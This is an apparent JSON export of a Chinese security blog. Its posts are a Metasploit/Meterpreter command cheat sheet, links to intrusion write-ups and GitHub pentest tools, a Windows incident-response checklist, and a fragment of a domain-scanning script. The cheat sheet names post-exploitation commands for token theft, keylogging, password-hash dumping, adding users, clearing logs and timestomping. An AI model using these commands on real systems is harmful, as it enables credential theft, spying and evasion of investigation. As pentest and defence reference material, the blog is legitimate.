return 0if __name__ == &apos;__main__&apos;: domain = [] with open(&apos;test5.txt&apos;,&apos;r&apos;) as f: for i in f.readlines(): domain.append(i.strip()) f.close() print(domain) start_time = time.time() pool = threadpool.ThreadPool(100) requests_1 = threadpool.makeRequests(getTitle, domain) [pool.putRequest(req) for req in requests_1] pool.wait() with open(&apos;test6.txt&apos;,&apos;w+&apos;,encoding=&apos;UTF-8&apos;) as f: for i in code_200: f.write(str(i) + &apos;\\n&apos;) for i in code_not200: f.write(str(i) + &apos;\\n&apos;) print(&apos;%d second&apos; % (time.time() - start_time))","categories":[],"tags":[]},{"title":"Msfconsole常用命令","slug":"Msfconsole常用命令","date":"2019-03-17T13:56:06.000Z","updated":"2019-05-18T17:32:54.508Z","comments":true,"path":"2019/03/17/Msfconsole常用命令/","link":"","permalink":"http://lilifengcode.github.io/2019/03/17/Msfconsole常用命令/","excerpt":"","text":"Msfconsole常用命令 命令： show exploits 列出metasploit框架中的所有渗透攻击模块。 命令：show payloads 列出metasploit框架中的所有攻击载荷。 1命令：show auxiliary 列出metasploit框架中的所有辅助攻击载荷。 1命令：search name 查找metasploit框架中所有的渗透攻击和其他模块。 1命令：info 展示出制定渗透攻击或模块的相关信息。 1命令：use name 装载一个渗透攻击或模块。 1命令：LHOST 你本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要是一个公共IP地址，特别为反弹式shell使用。 1命令：RHOST 远程主机或是目标主机。 1命令：set function 设置特定的配置参数（EG：设置本地或远程主机参数）。 1命令：setg function 以全局方式设置特定的配置参数（EG：设置本地或远程主机参数）。 1命令：show options 列出某个渗透攻击或模块中所有的配置参数。 1命令：show targets 列出渗透攻击所有支持的目标平台。 1命令：set target num 指定你所知道的目标的操作系统以及补丁版本类型。 1命令：set payload name 指定想要使用的攻击载荷。 1命令：show advanced 列出所有高级配置选项。 1命令：set autorunscript migrate -f. 在渗透攻击完成后，将自动迁移到另一个进程。 1命令：check 检测目标是否选定渗透攻击存在相应的安全漏洞。 1命令：exploit 执行渗透攻击或模块来攻击目标。 1命令：exploit -j 在计划任务下进行渗透攻击（攻击将在后台进行）。 1命令：exploit -z 渗透攻击完成后不与回话进行交互。 1命令：exploit -e encoder 制定使用的攻击载荷编码方式（EG：exploit -e shikata_ga_nai）。 1命令：exploit -h 列出exploit命令的帮助信息。 1命令：sessions -l 列出可用的交互会话（在处理多个shell时使用）。 1命令：sessions -l -v 列出所有可用的交互会话以及详细信息，EG：攻击系统时使用了哪个安全漏洞。 1命令：sessions -s script 在所有活跃的metasploit会话中运行一个特定的metasploit脚本。 1命令：sessions -K 杀死所有活跃的交互会话。 1命令：sessions -c cmd 在所有活跃的metasploit会话上执行一个命令。 1命令：sessions -u sessionID 升级一个普通的win32 shell到metasploit shell。 1命令：db_create name 创建一个数据库驱动攻击所要使用的数据库（EG：db_create autopwn）。 1命令：db_connect name 创建并连接一个数据库驱动攻击所要使用的数据库（EG：db_connect user:passwd@ip/sqlname）。 1命令：db_namp 利用nmap并把扫描数据存储到数据库中（支持普通的nmap语句，EG：-sT -v -P0）。 1命令：db_autopwn -h 展示出db_autopwn命令的帮助信息。 1命令：db_autopwn -p -r -e 对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。 1命令：db_destroy 删除当前数据库。 1命令：db_destroy user：passwd@host：port/database 使用高级选项来删除数据库。 metasploit命令Permalink 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677help 打开meterpreter使用帮助。run scriptname 运行meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。sysinfo 列出受控主机的系统信息。ls 列出目标主机的文件和文件夹信息。use priv 加载特权提升扩展模块，来扩展metasploit库。ps 显示所有运行的进程以及相关联的用户账户。migrate PID 迁移到一个指定的进程ID（PID号可通过ps命令从主机上获得）。use incognito 加载incognito功能（用来盗窃目标主机的令牌或假冒用户）list_tokens -u 列出目标主机用户的可用令牌。list_tokens -g 列出目标主机用户组的可用令牌。impersonate_token DOMAIN_NAME\\USERNAME 假冒目标主机上的可用令牌。steal_token PID 盗窃给定进程的可用令牌并进行令牌假冒。drop_token 停止假冒当前令牌。getsystem 通过各种攻击向量来提升系统用户权限。execute -f cmd.exe -i 执行cmd.exe命令并进行交互。execute -f cmd.exe -i -t 以所有可用令牌来执行cmd命令并隐藏该进程。rev2self 回到控制目标主机的初始用户账户下。reg command 在目标主机注册表中进行交互，创建，删除，查询等操作。setdesktop number 切换到另一个用户界面（该功能基于那些用户已登录）。screenshot 对目标主机的屏幕进行截图。upload file 向目标主机上传文件。download file 从目标主机下载文件。keyscan_start 针对远程目标主机开启键盘记录功能。keyscan_dump 存储目标主机上捕获的键盘记录。keyscan_stop 停止针对目标主机的键盘记录。getprivs 尽可能多的获取目标主机上的特权。uictl enable keyboard/mouse 接管目标主机的键盘和鼠标。background 将你当前的metasploit shell转为后台执行。hashdump 导出目标主机中的口令哈希值。use sniffer 加载嗅探模式。sniffer_interfaces 列出目标主机所有开放的网络端口。sniffer_dump interfaceID pcapname 在目标主机上启动嗅探。sniffer_start interfaceID packet-buffer 在目标主机上针对特定范围的数据包缓冲区启动嗅探。sniffer_stats interfaceID 获取正在实施嗅探网络接口的统计数据。sniffer_stop interfaceID 停止嗅探。add_user username password -h ip 在远程目标主机上添加一个用户。clearev 清楚目标主机上的日志记录。timestomp 修改文件属性，例如修改文件的创建时间（反取证调查）。reboot 重启目标主机。","categories":[],"tags":[]},{"title":"渗透测试实战报告","slug":"渗透测试实战报告","date":"2019-03-13T06:53:35.000Z","updated":"2019-05-23T13:49:59.665Z","comments":true,"path":"2019/03/13/渗透测试实战报告/","link":"","permalink":"http://lilifengcode.github.io/2019/03/13/渗透测试实战报告/","excerpt":"","text":"渗透文章列表 名称 链接 全套一条龙服务”之低权限dedecms的沦陷 https://laolisafe.com/994.html 微信赌场——H5棋牌游戏渗透之旅 http://www.cnblogs.com/ichunqiu/archive/2018/05/14/9036806.html 某业务网站逻辑漏洞之密码重置、支付逻辑、水平越权、任意用户注册漏洞 https://www.secquan.org/Discuss/1068741#reply2 Microsoft Windows “.contact”文件 HTML 链接注入远程执行代码（0day） https://www.secquan.org/Discuss/1068740#reply5 传销站渗透录 https://www.t00ls.net/articles-49757.html 某市政务云资源管理平台任意用户密码重置导致接管全市政务云 https://secquan.org/Discuss/1068679 某快递某C端从接口Getshell到内网提权到打下管控服务器 https://secquan.org/Discuss/1068651 三连爆拿下电诈网（ 菜鸟冒泡 ） https://secquan.org/Discuss/1068661 逻辑让我崩溃之越权姿势分享 https://xz.aliyun.com/t/4003 记一次想尽各种方法的渗透测试实战 https://zhuanlan.zhihu.com/p/38339745 一次漫长的渗透经历（帮女神解决问题） https://zhuanlan.zhihu.com/p/25887967 看我怎么渗透非法菠菜站点 https://zhuanlan.zhihu.com/p/26517508","categories":[],"tags":[]},{"title":"windows应急响应方案","slug":"windows应急响应方案","date":"2019-03-07T01:58:59.000Z","updated":"2019-04-10T15:42:40.391Z","comments":true,"path":"2019/03/07/windows应急响应方案/","link":"","permalink":"http://lilifengcode.github.io/2019/03/07/windows应急响应方案/","excerpt":"","text":"windows 应急处理方案0x01 什么是应急响应“应急响应”对应的英文是“Incident Response”或“Emergency Response”等，通常是指一个组织为了应对各种意外事件的发生所做的准备以及在事件发生后所采取的措施。 Ⅰ.对象 计算机网络安全事件应急响应的对象是指针对计算机或网络所存储、传输、处理的信息的安全事件，事件的主体可能来自自然界、系统自身故障、组织内部或外部的人、计算机病毒或蠕虫等。按照计算机信息系统安全的三个目标，可以把安全事件定义为破坏信息或信息处理系统CIA的行为。比如： 1．破坏保密性的安全事件：比如入侵系统并读取信息、搭线窃听、远程探测网络拓扑结构和计算机系统配置等 2．破坏完整性的安全事件：比如入侵系统并篡改数据、劫持网络连接并篡改或插入数据、安装特洛伊木马（如BackOrifice2K）、计算机病毒（修改文件或引导区）等 3．破坏可用性(战时最可能出现的网络攻击)的安全事件：比如系统故障、拒绝服务攻击、计算机蠕虫（以消耗系统资源或网络带宽为目的）等。但是越来越多的人意识到，CIA界定的范围太小了，比如以下事件通常也是应急响应的对象： 4．扫描：包括地址扫描和端口扫描等，为了侵入系统寻找系统漏洞。 5．抵赖：指一个实体否认自己曾经执行过的某种操作，比如在电子商务中交易方之一否认自己曾经定购过某种商品，或者商家否认自己曾经接受过订单。 6．垃圾邮件骚扰：垃圾邮件是指接收者没有订阅却被强行塞入信箱的广告、政治宣传等邮件，不仅耗费大量的网络与存储资源，也浪费了接收者的时间。 7．传播色情内容：尽管不同的地区和国家政策不同，但是多数国家对于色情信息的传播是限制的，特别是对于青少年儿童的不良影响是各国都极力反对的。 8．愚弄和欺诈：是指散发虚假信息造成的事件，比如曾经发生过几个组织发布应急通告，声称出现了一种可怕的病毒“Virtual Card for You”，导致大量惊惶失措的用户删除了硬盘中很重要的数据，导致系统无法启动。 Ⅱ.主要意义 应急响应的活动应该主要包括两个方面： 第一、未雨绸缪，即在事件发生前事先做好准备，比如风险评估、制定安全计划、安全意识的培训、以发布安全通告的方式进行的预警、以及各种防范措施 第二、亡羊补牢，即在事件发生后采取的措施，其目的在于把事件造成的损失降到最小。这些行动措施可能来自于人，也可能来自系统，不如发现事件发生后，系统备份、病毒检测、后门检测、清除病毒或后门、隔离、系统恢复、调查与追踪、入侵者取证等一系列操作。 以上两个方面的工作是相互补充的。首先，事前的计划和准备为事件发生后的响应动作提供了指导框架，否则，响应动作将陷入混乱，而这些毫无章法的响应动作有可能造成比事件本身更大的损失；其次，事后的响应可能发现事前计划的不足，吸取教训，从而进一步完善安全计划。因此，这两个方面应该形成一种正反馈的机制，逐步强化组织的安全防范体系。 0x02 应急响应事件分类 常见的应急响应事件分类： web入侵：网页挂马、主页篡改、Webshell 系统入侵：病毒木马蠕虫、勒索软件、远控后门、rdp\\ssh爆破 网络攻击：DDOS攻击、DNS劫持、ARP欺骗 信息泄露：脱裤、数据库弱口令 ps:还有一种，叫自己人的渗透！！！ 0x03 排查流程 注:业内通常使用的PDCERF方法学（最早由 1987 年美国宾夕法尼亚匹兹堡软件工程研究所在关于应急响应的邀请工作会议上提出），将应急响应分成准备（Preparation）、检测（Detection）、抑制（Containment）、根除（Eradication）、恢复（Recovery）、跟踪（Follow-up）6个阶段的工作，并根据网络安全应急响应总体策略对每个阶段定义适当的目的，明确响应顺序和过程。 ​ 准备阶段——&gt;检测阶段——&gt;抑制阶段——&gt;根除阶段——&gt;恢复阶段——&gt;跟踪总结 下图自画，非PDCERF模型 文件分析 a) 文件日期、新增文件、可疑/异常文件、最近使用文件、浏览器下载文件 b) Webshell 排查与分析 c) 核心应用关联目录文件分析 端口分析 a)敏感端口开放问题，3389、139、135等 进程分析 a) 当前活动进程-可疑进程 &amp; 远程连接 b) 启动进程&amp;计划任务 c) 进程工具分析 i. Windows:Pchunter ii. Linux: Chkrootkit&amp;Rkhunter 系统信息 a) 环境变量 b) 帐号信息 c) History d) 系统配置文件 日志分析 a) 操作系统日志 i. Windows: 事件查看器（eventvwr） ii. Linux: /var/log/ b) 应用日志分析 i. Access.log ii. Error.log0x04 常规排查流程 检查系统账号安全 a)查看服务器是否有弱口令 b）查看服务器是否存在可疑账号、新增账号 检查方法： 打开 cmd 窗口，输入lusrmgr.msc命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉 c)查看服务器是否存在隐藏账号、克隆账号 检查方法： 打开注册表 ，查看管理员对应键值。 使用 D 盾 _web 查杀工具，集成了对克隆账号检测的功能 ![](https://s2.ax1x.com/2019/03/06/kv3ise.png) 检查异常端口 a)netstat -ano 查看目前的网络连接，定位可疑的 ESTABLISHED b)根据 netstat 定位出的 pid，再通过 tasklist 命令进行进程定位 tasklist | findstr “PID” 进程 a)开始--运行--输入 msinfo32，依次点击“软件环境→正在运行任务”就可以查看到进程的详细信息，比如进程路径、进程 ID、文件创建日期、启动时间等。 ![](https://s2.ax1x.com/2019/03/06/kv8ukR.png) b)打开 D 盾 _web 查杀工具，进程查看，关注没有签名信息的进程。 ![](https://s2.ax1x.com/2019/03/06/kv8RNn.png) c)通过微软官方提供的 Process Explorer 等工具进行排查 。 d)查看可疑的进程及其子进程。可以通过观察以下内容： 没有签名验证信息的进程 没有描述信息的进程 进程的属主 进程的路径是否合法 CPU 或内存资源占用长时间过高的进程 检查启动项 a)登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。 b)单击开始菜单 &gt;【运行】，输入 msconfig，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。 c)单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项： HKEY_CURRENT_USERsoftwaremicorsoftwindowscurrentversionrun HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRun HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRunonce 检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。 d)利用安全软件查看启动项、开机时间管理等。 e)组策略，运行 gpedit.msc。 检查计划任务 a)单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。 b)单击【开始】&gt;【运行】；输入 cmd，然后输入at，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接 服务自启动 单击【开始】&gt;【运行】，输入 services.msc，注意服务状态和启动类型，检查是否有异常服务。 检查系统相关信息 查看系统版本以及补丁信息 单击【开始】&gt;【运行】，输入 systeminfo，查看系统信息 日志分析 a)前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。 b)Win+R 打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。 C)导出应用程序日志、安全日志、系统日志，利用 Log Parser 进行分析。 WEB 访问日志： a）找到中间件的 web 日志，打包到本地方便进行分析。0x05 综合排查工具 火绒剑 猎隼 文件监视器 PS其实无非就是“打补丁、升级，再厉害我拔网线，再厉害我拆硬盘还原快照，莫得怕它，盘它就完了","categories":[],"tags":[]},{"title":"github渗透测试项目","slug":"github渗透测试项目","date":"2019-01-08T02:29:49.000Z","updated":"2019-04-14T13:41:04.878Z","comments":true,"path":"2019/01/08/github渗透测试项目/","link":"","permalink":"http://lilifengcode.github.io/2019/01/08/github渗透测试项目/","excerpt":"","text":"https://github.com/sysorem/Kali-Linux-Pentest-Basic https://github.com/reider-roque/pentest-tools https://github.com/wizardforcel/kali-linux-web-pentest-cookbook-zh https://github.com/NullArray/IntRec-Pack https://github.com/MalQR/MalQR.github.io https://github.com/merttasci/weapons4pentester https://github.com/owtf/wafbypasser https://github.com/braimee/bpatty https://github.com/HarmJ0y/cortana https://github.com/sevagas/macro_pack https://github.com/gat3way/AirPirate https://github.com/wavestone-cdt/hadoop-attack-library https://github.com/chamli/CyberCrowl https://github.com/curesec/tools https://github.com/vergl4s/pentesting-dump https://github.com/toxic-ig/Trity https://github.com/Sh1n0g1/ShinoBOT https://github.com/rossja/pentools https://github.com/ankh2054/windows-pentest https://github.com/bl4de/research https://github.com/mgeeky/RobustPentestMacro https://github.com/fnk0c/organon https://github.com/jmortega/python-pentesting https://github.com/CERT-W/hadoop-attack-library https://github.com/AppSecConsulting/Pentest-Tools https://github.com/r00t-3xp10it/netool-toolkit https://github.com/Ganapati/wpyscan https://github.com/onurkarasalihoglu/Pentest-Tools https://github.com/mstsec/mst https://github.com/NullArray/MIDA-Multitool https://github.com/lawsecnet/Pentesting-with-Python https://github.com/whitehat-zero/PowEnum https://github.com/jaredhaight/PowerPunch https://github.com/Phreak87/ESPeensy-and-Peensy-Payload-Generator-ESP8266-Teensy-3.5- https://github.com/tfairane/Pentest https://github.com/hvqzao/report-ng https://github.com/p00gz/vagrant-pentester https://github.com/pasknel/beholder https://github.com/ElectronicCats/SamyKamTools https://github.com/Twi1ight/AD-Pentest-Script https://github.com/Wh1t3Rh1n0/ssh-phone-home https://github.com/darkr4y/pentest-script https://github.com/SaltwaterC/sploit-tools https://github.com/ayoul3/cicspwn https://github.com/ptresearch/Pentest-Detections https://github.com/Wh1t3Rh1n0/pentest-scripts https://github.com/webstersprodigy/webstersprodigy https://github.com/hiteshchoudhary/Airvengers https://github.com/Crapworks/pentest https://github.com/woodspeed/Pentest https://github.com/xl7dev/SecTools https://github.com/ankh2054/linux-pentest https://github.com/MrTchuss/NetworkTools https://github.com/n3k/Pentest https://github.com/Xyntax/Drystan https://github.com/r0bag/pentest https://github.com/milo2012/pentest_automation https://github.com/Snifer/GPT https://github.com/Oneiroi/PenTesting https://github.com/jivoi/ansible-pentest-with-tor https://github.com/owtf/ptp https://github.com/augustd/burp-suite-error-message-checks https://github.com/joshuaskorich/pentest-tools https://github.com/royharoush/rtools https://github.com/enaqx/awesome-pentest https://github.com/juliocesarfort/public-pentesting-reports https://github.com/byt3bl33d3r/CrackMapExec https://github.com/dloss/python-pentest-tools https://github.com/onlurking/awesome-infosec https://github.com/1N3/Sn1per https://github.com/swisskyrepo/PayloadsAllTheThings https://github.com/evilcos/xssor2 https://github.com/tanprathan/MobileApp-Pentest-Cheatsheet https://github.com/stampery/mongoaudit https://github.com/leebaird/discover https://github.com/SecWiki/windows-kernel-exploits https://github.com/SecWiki/linux-kernel-exploits https://github.com/maurosoria/dirsearch https://github.com/nixawk/pentest-wiki https://github.com/pwnieexpress/raspberry_pwn https://github.com/infobyte/spoilerwall https://github.com/dmayer/idb https://github.com/Tylous/SniffAir https://github.com/owtf/owtf https://github.com/infobyte/evilgrade https://github.com/D4Vinci/Dr0p1t-Framework https://github.com/praetorian-inc/pentestly https://github.com/l3m0n/pentest_study https://github.com/m4n3dw0lf/pythem https://github.com/jaredhaight/PSAttack https://github.com/coreb1t/awesome-pentest-cheat-sheets https://github.com/bt3gl/My-Gray-Hacker-Resources https://github.com/averagesecurityguy/scripts https://github.com/ron190/jsql-injection https://github.com/1N3/Findsploit https://github.com/Sliim/pentest-env https://github.com/graniet/chromebackdoor https://github.com/leonteale/pentestpackage https://github.com/v3n0m-Scanner/V3n0M-Scanner https://github.com/jhaddix/pentest-bookmarks https://github.com/sensepost/objection https://github.com/georgiaw/Smartphone-Pentest-Framework https://github.com/salesforce/vulnreport https://github.com/cujanovic/SSRF-Testing https://github.com/jivoi/pentest https://github.com/WebBreacher/offensiveinterview https://github.com/brianwrf/hackUtils https://github.com/4w4k3/BeeLogger https://github.com/julienbedard/browsersploit https://github.com/Sliim/pentest-lab https://github.com/adi0x90/attifyos https://github.com/felipedaragon/sandcat https://github.com/Screetsec/LALIN https://github.com/maldevel/gdog https://github.com/LandGrey/pydictor https://github.com/HSIS007/Useful_Websites_For_Pentester https://github.com/stanislav-web/OpenDoor https://github.com/Fuzzapi/fuzzapi https://github.com/ym2011/penetration https://github.com/jesusprubio/bluebox-ng https://github.com/ChrisTruncer/PenTestScripts https://github.com/guardicore/monkey https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest https://github.com/garethr/pentesting-playground https://github.com/Ridter/Pentest https://github.com/alpha1e0/pentestdb https://github.com/nccgroup/UPnP-Pentest-Toolkit https://github.com/hvqzao/foolav https://github.com/sidaf/homebrew-pentest https://github.com/hahwul/droid-hunter https://github.com/RASSec/pentestEr_Fully-automatic-scanner https://github.com/netbiosX/Checklists https://github.com/maldevel/canisrufus https://github.com/madmantm/ubuntu-pentest-tools https://github.com/shawarkhanethicalhacker/D-TECT https://github.com/milo2012/pentest_scripts https://github.com/hugsy/proxenet https://github.com/4w4k3/Insanity-Framework https://github.com/bitvijays/Pentest-Scripts https://github.com/mossberg/poet https://github.com/killswitch-GUI/PenTesting-Scripts https://github.com/chuhades/dnsbrute https://github.com/epsylon/cintruder https://github.com/1N3/ReverseAPK https://github.com/DanMcInerney/pentest-machine https://github.com/4w4k3/Umbrella https://github.com/yaseng/pentest https://github.com/alienwithin/OWASP-mth3l3m3nt-framework https://github.com/gwen001/pentest-tools https://github.com/l3m0n/pentest_tools https://github.com/the-useless-one/pywerview https://github.com/maldevel/PenTestKit https://github.com/mrschyte/pentestkoala https://github.com/hugsy/stuff https://github.com/wavestone-cdt/wavecrack https://github.com/PentestBox/pentest-box-tools https://github.com/tomsteele/pen-utils https://github.com/etolstoy/ParseRevealer https://github.com/Hood3dRob1n/Kalista https://github.com/ffmancera/pentesting-multitool https://github.com/0x90/vpn-arsenal https://github.com/NickSanzotta/smbShakedown https://github.com/CoolerVoid/Ooze https://github.com/m57/piescan https://github.com/pentestify/pentest-console https://github.com/j0bin/Pentest-Resources https://github.com/tevora-threat/splunk_pentest_app https://github.com/erforschr/http-auth-bruteforcer https://github.com/Sw4mpf0x/Tools https://github.com/CCSIR/WP-Plugins-Scanner https://github.com/0x90/pentest https://github.com/vduddu/PentestResources https://github.com/LennonCMJ/pentest_script https://github.com/ksanchezcld/Hacking_Cheat_Sheet https://github.com/queenmarie/GhostRedefined https://github.com/carnal0wnage/pentesty_scripts https://github.com/styx00/Apache-Vulns https://github.com/thomaspatzke/NastyWebHackme https://github.com/ueno1000/WebAppPentestGuidelines https://github.com/ZephrFish/Blog_Backup https://github.com/owtf/online-passive-scanner https://github.com/DrizzleRisk/NTPDoser https://github.com/cujanovic/CVE-2016-8610-PoC https://github.com/PaulSec/VNWA https://github.com/c4bbage/pentestscripts https://github.com/Feanaur/Scapy-Pentest https://github.com/citizen428/pentesting https://github.com/dostoevskylabs/dostoevsky-pentest-notes https://github.com/phillips321/phillips321 https://github.com/royalharsh/pentest-bookmarks https://github.com/TheZ3ro/penmode3 https://github.com/NullArray/PyParser-CVE https://github.com/highmeh/pentest_scripts https://github.com/n0ix/pyJenkinsToolkit https://github.com/phackt/pentest https://github.com/cervoise/pentest-scripts https://github.com/madScript01/pentestoolkit https://github.com/BeLove/pentest-tools https://github.com/ricardolongatto/dnsrato https://github.com/OWASP-Ruhrpott/owasp-workshop-android-pentest https://github.com/koutto/java-binary-deserializer https://github.com/radicallyopensecurity/pentesting-scripts https://github.com/koutto/jok3r https://github.com/alienwithin/Scripts-Sploits https://github.com/pasknel/BackGram https://github.com/jseidl/usernamer https://github.com/Screetsec/super-dracos https://github.com/libcrack/pentest https://github.com/ironbits/awesome-pentest-tools https://github.com/augustd/burp-suite-token-fetcher https://github.com/PentestBox/pentest-box-website https://github.com/P3t3rp4rk3r/My_Dirty_Scripts https://github.com/ucki/umpf https://github.com/jhwohlgemuth/pentest-lab https://github.com/hvqzao/x https://github.com/lucasgates/NinjaLinux https://github.com/wasupwithuman/ScrapeME https://github.com/the-Infected-Drake/TIDoS https://github.com/pelesmk/pentest https://github.com/augustd/burp-suite-software-version-checks https://github.com/NullArray/Shellshocker https://github.com/securestate/python-for-pentesters-webinar https://github.com/JohnTroony/Python-tools-for-Pentesters- https://github.com/fluproject/winpentesttools https://github.com/KMGbully/hacksaw https://github.com/clayball/wily-possum https://github.com/lanjelot/pentest-tricks https://github.com/owtf/boilerplate-templates https://github.com/madmantm/fedora-pentest-tools https://github.com/tatanus/Python4Pentesters https://github.com/koutto/compression-identifier https://github.com/pavetheway/Pentester_Cheat_Sheet https://github.com/Sliim/pentest-chef-repo https://github.com/meitar/pentest-links https://github.com/RobertShala/Offensive-Scripts https://github.com/musicmancorley/HVACScanner https://github.com/gitgik/penetration-testing https://github.com/bugbound/webnuke https://github.com/anantshri/manual_verification https://github.com/washal/pentest https://github.com/NullArray/Shellware https://github.com/DrizzleRisk/Armyworm https://github.com/sliim-cookbooks/pentester https://github.com/mukareste/utils https://github.com/ToxicRoot/pentest_scripts https://github.com/blackthorne/Pentest-utils https://github.com/iuristanchev/pentesting_tools https://github.com/RASSec/nsfocus_RSAS_Auto_pentest https://github.com/A-mIn3/pentest_tools https://github.com/ThoughtfulDev/CME-BruteForcer https://github.com/edsoncelio/ctf-guide https://github.com/SOl0m0n/Scripts-to-PenTest https://github.com/koutto/dotnet-binary-deserializer https://github.com/mike-lesniak/backtrack-scripts https://github.com/Chaudhary-Adeel/Pentester-Toolkit https://github.com/0x4141414141/pentest_env https://github.com/l0gan/PenTestScripts https://github.com/ahmetgurel/Pentest-Hints https://github.com/belane/linux-soft-exploit-suggester https://github.com/jaredhaight/scripts https://github.com/crown-prince/PentesterLab_Bootcamp https://github.com/ring0lab/Weaponry https://github.com/Inf0Junki3/pentesty_goodness https://github.com/jhalon/PortForce https://github.com/StaymanHou/Hacking-the-Pentest-Tutor-Game https://github.com/drigg3r/SnCrawler https://github.com/444xxk/dumbpentester https://github.com/Demontager/HoneyWIFI https://github.com/fnzv/Boafi https://github.com/proxyanon/BatSploit https://github.com/Antrax810/Tex https://github.com/Yukinoshita47/lazywpscan https://github.com/Margular/pentest https://github.com/sidhant511/Pentest https://github.com/gymzombie/PentestPi https://github.com/bluec0re/pentest_utils https://github.com/vendetta/AmebaFramework https://github.com/Dshellnoi-Unix/Shurik3n https://github.com/augustd/burp-suite-gwt-scan https://github.com/mattoufoutu/msfmulti https://github.com/t57root/oh-my-lovely-shell https://github.com/jrmdev/Tools https://github.com/absolomb/Pentesting https://github.com/Coretool/botmap https://github.com/Muhammd/Awesome-Pentest https://github.com/Double08/my-pentest https://github.com/St0rn/Pentest_tools https://github.com/maldevel/dicerosbicornis https://github.com/Sliim/elite-stuff https://github.com/theforcedk/notricks_usb https://github.com/ismailtasdelen/Python-Pentest-ToolKit https://github.com/owtf/spyderjax https://github.com/BlacksInTechnologyOrg/bit-pentest-labs https://github.com/deekayen/aws-pentest-inventory https://github.com/ticarpi/my-pentesting-repo https://github.com/SonareOrganization/SonaAIv1 https://github.com/porthunter/smoof https://github.com/initstring/kali-scripts https://github.com/Hadi999/IDTscan https://github.com/Hood3dRob1n/MySQL-Fu.rb https://github.com/tsondt/oscp https://github.com/stevecoward/pentest-scripts https://github.com/0xdevalias/devalias-pentest https://github.com/leebaird/assessment-manager https://github.com/JamesHovious/pentest-scripts https://github.com/Faidon09/PyPentest https://github.com/Vulnerability-scanner/Sn1per https://github.com/secureideas/pentesterscripting https://github.com/cldrn/pentesting https://github.com/Snifer/HackingTools https://github.com/awhitehatter/docker-pentest-lists https://github.com/pentest-standard/docs https://github.com/sh3llc0d3r1337/MobilePentest https://github.com/eaesh/awesome-pentest https://github.com/p0c/pentest-tools https://github.com/xnianq/pentest_tools https://github.com/russia-pentest/pentest_scanner https://github.com/chuhades/pentest-scripts https://github.com/ston3o/docker-pentest https://github.com/Programming-Fun/awesome-pentest https://github.com/grayburn/wireless-pentesting https://github.com/LandGrey/shakala https://github.com/mgeeky/PhishingPost https://github.com/y0ug/docker-wops https://github.com/fikr4n/linux-pentest-util https://github.com/markszabo/Marks-Pentest-Challenge https://github.com/HSIS007/pentest_best_tools https://github.com/FatihEgbatan/Tools https://github.com/Coretool/RageKiddy https://github.com/BastienFaure/jarvis https://github.com/it-solunium/ith https://github.com/kali-docs-cn/kali-linux-wireless-pentest-zh https://github.com/mhackgyver-squad/mhackgyver https://github.com/mike01/ifi https://github.com/revenssis/Revenssis_Pentesting_Suite https://github.com/f-0x7r0t/Unified-Pentesting-Framework https://github.com/feralfenrir/Pentesting-networks-with-Nmap https://github.com/abbotto/pluto https://github.com/Exploit-install/mongoaudit https://github.com/tcpiplab/Web-App-Hacking-Notes https://github.com/k0fin/aftermarket https://github.com/FreedomCoder/headerscanner https://github.com/earuiz/Homero https://github.com/Cashiuus/penprep https://github.com/mgeeky/dirbuster https://github.com/ppolstra/MeshDeck https://github.com/wooy0ung/pentest https://github.com/geekbooks/pentest https://github.com/adislj/Pentest_Study https://github.com/TheZ3ro/pencore.py https://github.com/lightbulbone/pentesting https://github.com/sliim-cookbooks/pentestenv https://github.com/freddiebarrsmith/pentestscripts https://github.com/carterjones/pentesting https://github.com/archey/pentesting https://github.com/pentesting/Pentesting https://github.com/djadmin/pwn https://github.com/magnusstubman/nmapoutputbrowser https://github.com/d3ad7rack/PentestingAcademy https://github.com/GrrrDog/web_lists https://github.com/TheZ3ro/penmode https://github.com/materaj/pentest-cheatsheet https://github.com/WangYihang/Codiad-pentest https://github.com/essejhsif/pentest_resources https://github.com/Miscellaneous0/awesome-pentest https://github.com/busbauen/pentest-wiki https://github.com/netbiosX/Pentest-Scripts https://github.com/JakeBernier/Pentest_Resources https://github.com/owtf/login-sessions-plugin https://github.com/robert-wood/network_pentesting_toolkit https://github.com/zakansecurity/proxy-brute-force https://github.com/PentestBox/pentest-box-docs https://github.com/PentestBox/pentest-box-faq https://github.com/any-how/python-pentest-tools https://github.com/PortalTIC/PenTest-Scripts https://github.com/HduGeek/Basic-web-pentest https://github.com/wetw0rk/Misc-Pentest-Tools https://github.com/ahmetgurel/NetworkPentestPresentations https://github.com/tekale2/Arduino-uno-usb-pentest https://github.com/batchmcnulty/uberscan https://github.com/mbartoli/heart-attack https://github.com/RicterZ/moescan https://github.com/VillanCh/vikit https://github.com/Zumkato/Testing-Cheats- https://github.com/ruuand/ruuand.github.io https://github.com/baldwmic/wifi-pentesting https://github.com/Drx51/Ruby-scripts https://github.com/dschwenk/Python-For-Offensive-PenTest https://github.com/The-Cracker-Technology/andrax https://github.com/yanikore/phpBrute https://github.com/r1k0/forensics https://github.com/okabe/tools https://github.com/oliveiradeflavio/auditoria https://github.com/chrisbensch/scripts https://github.com/pietermyb/PenTestSQL https://github.com/klks/Introduction_to_pentesting https://github.com/Unallocated/Pentesting-Study-Group https://github.com/aszone/Hacking https://github.com/m101/m101-tools https://github.com/Ownz/Ownz-Brute-Force https://github.com/PaRaBaL-Inc/MAST https://github.com/igordelorenzi/irc-bot 